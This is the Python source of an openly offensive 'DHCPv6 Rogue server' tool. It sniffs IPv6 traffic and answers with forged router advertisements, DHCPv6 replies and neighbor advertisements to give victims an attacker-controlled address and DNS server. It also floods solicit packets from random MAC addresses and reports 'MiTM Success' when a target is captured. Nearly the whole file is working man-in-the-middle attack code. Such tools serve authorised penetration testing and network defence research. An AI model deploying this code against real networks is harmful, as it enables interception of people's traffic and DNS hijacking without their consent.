#!/usr/bin/env python

from base import Base
from network import DHCPv6_raw, ICMPv6_raw, Ethernet_raw, IPv6_raw
from sys import exit
from argparse import ArgumentParser
from scapy.all import sniff, Ether, IPv6, DHCP6_Solicit, DHCP6_Request, DHCP6_Release, DHCP6_Confirm, DHCP6_Decline
from scapy.all import DHCP6OptClientId, DHCP6OptIAAddress, DHCP6OptServerId, ICMPv6ND_NS, ICMPv6ND_RS
from socket import socket, AF_PACKET, SOCK_RAW
from tm import ThreadManager
from random import randint
from time import sleep

current_network_interface = None
target_mac_address = None
target_ip_address = None
recursive_dns_address = None

need_neighbor_advertise = False
dhcpv6_request_in_your_server = False
icmpv6_neighbor_solicit_your_ip = False
already_print_success_message = False

Base = Base()
Base.check_user()
Base.check_platform()

tm = ThreadManager(3)

parser = ArgumentParser(description='DHCPv6 Rogue server')

parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
parser.add_argument('-p', '--prefix', type=str, help='Set network prefix', default='fd00::/64')
parser.add_argument('-f', '--first_suffix_ip', type=str, help='Set first suffix client ip for offering', default='2')
parser.add_argument('-l', '--last_suffix_ip', type=str, help='Set last suffix client ip for offering', default='255')
parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
parser.add_argument('-I', '--target_ip', type=str, help='Set client IPv6 address with MAC in --target_mac', default=None)
parser.add_argument('-d', '--dns', type=str, help='Set recursive DNS IPv6 address', default=None)
parser.add_argument('-s', '--dns_search', type=str, help='Set DNS search list', default="test.com")
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
parser.add_argument('--apple', action='store_true', help='Apple devices MiTM')
args = parser.parse_args()

if not args.quiet:
    Base.print_banner()

eth = Ethernet_raw()
ipv6 = IPv6_raw()
dhcpv6 = DHCPv6_raw()
icmpv6 = ICMPv6_raw()

if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

global_socket = socket(AF_PACKET, SOCK_RAW)
global_socket.bind((current_network_interface, 0))

network_prefix = args.prefix
dns_search = args.dns_search

if args.target_mac is not None:
    target_mac_address = str(args.target_mac).lower()

if args.target_ip is not None:
    target_ip_address = args.target_ip
    ipv6_address = args.target_ip
else:
    ipv6_address = "fd00::34e"

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ipv6_link_address = Base.get_netiface_ipv6_link_address(current_network_interface)
if your_ipv6_link_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IPv6 link local address!"
    exit(1)

your_ipv6_glob_address = Base.get_netiface_ipv6_glob_address(current_network_interface)
if your_ipv6_glob_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IPv6 global address!"
    exit(1)

if args.dns is None:
    recursive_dns_address = your_ipv6_glob_address
else:
    recursive_dns_address = args.dns

if not args.quiet:
    print Base.c_info + "Network interface: " + Base.cINFO + current_network_interface + Base.cEND
    print Base.c_info + "Your MAC address: " + Base.cINFO + your_mac_address + Base.cEND
    print Base.c_info + "Your IPv6 link local address: " + Base.cINFO + your_ipv6_link_address + Base.cEND
    if args.target_mac is not None:
        print Base.c_info + "Target MAC: " + Base.cINFO + args.target_mac + Base.cEND
    if args.target_ip is not None:
        print Base.c_info + "Target IP: " + Base.cINFO + args.target_ip + Base.cEND
    else:
        print Base.c_info + "First suffix offer IP: " + Base.cINFO + args.first_suffix_ip + Base.cEND
        print Base.c_info + "Last suffix offer IP: " + Base.cINFO + args.last_suffix_ip + Base.cEND
    print Base.c_info + "Prefix: " + Base.cINFO + network_prefix + Base.cEND
    print Base.c_info + "Router IPv6 address: " + Base.cINFO + your_ipv6_link_address + Base.cEND
    print Base.c_info + "DNS IPv6 address: " + Base.cINFO + recursive_dns_address + Base.cEND
    print Base.c_info + "Domain search: " + Base.cINFO + dns_search + Base.cEND


def send_icmpv6_solicit_packets():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    while True:
        pkt = icmpv6.make_router_solicit_packet(ethernet_src_mac=your_mac_address,
                                                ipv6_src=your_ipv6_link_address,
                                                need_source_link_layer_address=True,
                                                source_link_layer_address=eth.get_random_mac())
        SOCK.send(pkt)
        sleep(0.1)


def send_dhcpv6_solicit_packets():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    while True:
        Client_DUID = dhcpv6.get_duid(eth.get_random_mac())
        request_options = [23, 24]

        pkt = dhcpv6.make_solicit_packet(ethernet_src_mac=your_mac_address,
                                         ipv6_src=your_ipv6_link_address,
                                         transaction_id=randint(1, 16777215),
                                         client_identifier=Client_DUID,
                                         option_request_list=request_options)
        SOCK.send(pkt)
        sleep(0.1)


def send_icmpv6_advertise_packets():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    if target_mac_address is not None:
        icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                   ethernet_dst_mac=target_mac_address,
                                                                   ipv6_src=your_ipv6_link_address,
                                                                   ipv6_dst=Base.create_ipv6_link_address(target_mac_address),
                                                                   dns_address=recursive_dns_address,
                                                                   domain_search=dns_search,
                                                                   prefix=network_prefix)
        while True:
            SOCK.send(icmpv6_ra_packet)
            sleep(0.1)


def reply(request):
    global global_socket
    global ipv6_address
    global need_neighbor_advertise
    global icmpv6_neighbor_solicit_your_ip
    global dhcpv6_request_in_your_server
    global already_print_success_message
    
    # ICMPv6 Router Solicitation
    if request.haslayer(ICMPv6ND_RS):
        print Base.c_info + "Sniff ICMPv6 Router Solicitation request from: " + request[IPv6].src + " (" + \
              request[Ether].src + ")"
        icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                   ethernet_dst_mac=request[Ether].src,
                                                                   ipv6_src=your_ipv6_link_address,
                                                                   ipv6_dst=request[IPv6].src,
                                                                   dns_address=recursive_dns_address,
                                                                   domain_search=dns_search,
                                                                   ipv6_addr=ipv6_address,
                                                                   prefix=network_prefix)
        try:
            global_socket.send(icmpv6_ra_packet)
            print Base.c_info + "Send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
                  request[Ether].src + ")"
        except:
            print Base.c_error + "Do not send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
                  request[Ether].src + ")"

    # ICMPv6 Neighbor Solicitation
    if request.haslayer(ICMPv6ND_NS):
        if request[ICMPv6ND_NS].tgt != ipv6_address or need_neighbor_advertise:
            if request[ICMPv6ND_NS].tgt is not None:
                icmpv6_na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                             ipv6_src=your_ipv6_link_address,
                                                                             target_ipv6_address=request[ICMPv6ND_NS].tgt)
                for _ in range(5):
                    global_socket.send(icmpv6_na_packet)
            need_neighbor_advertise = False
        else:
            icmpv6_neighbor_solicit_your_ip = True

    # DHCPv6 Solicit
    if request.haslayer(DHCP6_Solicit):
        print Base.c_info + "Sniff DHCPv6 Solicit from: " + request[IPv6].src + " (" + \
              request[Ether].src + ") TID: " + hex(request[DHCP6_Solicit].trid)
        dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
                                                        ethernet_dst_mac=request[Ether].src,
                                                        ipv6_src=your_ipv6_link_address,
                                                        ipv6_dst=request[IPv6].src,
                                                        transaction_id=request[DHCP6_Solicit].trid,
                                                        dns_address=recursive_dns_address,
                                                        domain_search=dns_search,
                                                        ipv6_address=ipv6_address,
                                                        client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
        try:
            global_socket.send(dhcpv6_advertise)
            print Base.c_info + "Send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
                  request[Ether].src + ")"
        except:
            print Base.c_error + "Do not send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
                  request[Ether].src + ")"

    # DHCPv6 Request
    if request.haslayer(DHCP6_Request):
        print Base.c_info + "Sniff DHCPv6 Request from: " + request[IPv6].src + " (" + \
              request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid) + \
              " Server MAC: " + request[DHCP6OptServerId].duid.lladdr + " IAADDR: " + request[DHCP6OptIAAddress].addr
        # print request.summary
        if request[DHCP6OptServerId].duid.lladdr != your_mac_address:
            need_neighbor_advertise = True
        else:
            dhcpv6_request_in_your_server = True

        dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                ethernet_dst_mac=request[Ether].src,
                                                ipv6_src=your_ipv6_link_address,
                                                ipv6_dst=request[IPv6].src,
                                                transaction_id=request[DHCP6_Request].trid,
                                                dns_address=recursive_dns_address,
                                                domain_search=dns_search,
                                                ipv6_address=ipv6_address,
                                                client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
        try:
            global_socket.send(dhcpv6_reply)
            print Base.c_info + "Send DHCPv6 Reply to: " + request[IPv6].src + " (" + request[Ether].src + ")"
        except:
            print Base.c_error + "Do not send DHCPv6 Reply to: " + request[IPv6].src + " (" + \
                  request[Ether].src + ")"

    # DHCPv6 Release
    if request.haslayer(DHCP6_Release):
        print Base.c_info + "Sniff DHCPv6 Release from: " + request[IPv6].src + " (" + \
              request[Ether].src + ") TID: " + hex(request[DHCP6_Release].trid)

    # DHCPv6 Confirm
    if request.haslayer(DHCP6_Confirm):
        print Base.c_info + "Sniff DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
              request[Ether].src + ") TID: " + hex(request[DHCP6_Confirm].trid)

    # DHCPv6 Decline
    if request.haslayer(DHCP6_Decline):
        print Base.c_warning + "Sniff DHCPv6 Decline from: " + request[IPv6].src + " (" + \
              request[Ether].src + ") TID: " + hex(request[DHCP6_Decline].trid) + \
              " IAADDR: " + request[DHCP6OptIAAddress].addr
        # print request.summary

    # Print MiTM Success message
    if icmpv6_neighbor_solicit_your_ip and dhcpv6_request_in_your_server and not already_print_success_message:
        if target_ip_address is not None:
            print Base.c_success + "MiTM Success: " + target_ip_address + " (" + target_mac_address + ")"
            already_print_success_message = True
            exit(0)

    # else:
    #     print request.summary
    #


if __name__ == "__main__":
    tm.add_task(send_icmpv6_solicit_packets)
    tm.add_task(send_icmpv6_advertise_packets)
    # tm.add_task(send_dhcpv6_solicit_packets)

    if args.target_ip is not None:
        if args.target_mac is None:
            print Base.c_error + "Please set target MAC address (--target_mac 00:AA:BB:CC:DD:FF) for target IPv6!"
            exit(1)

    if args.target_mac is None:
        print Base.c_info + "Waiting for a ICMPv6 RS or DHCPv6 requests ..."
        sniff(lfilter=lambda d: d.src != your_mac_address,
              filter="icmp6 or (udp and src port 546 and dst port 547)",
              prn=reply, iface=current_network_interface)
    else:
        print Base.c_info + "Waiting for a ICMPv6 RS, NS or DHCPv6 requests from: " + args.target_mac + " ..."
        sniff(lfilter=lambda d: d.src == args.target_mac,
              filter="icmp6 or (udp and src port 546 and dst port 547)",
              prn=reply, iface=current_network_interface)
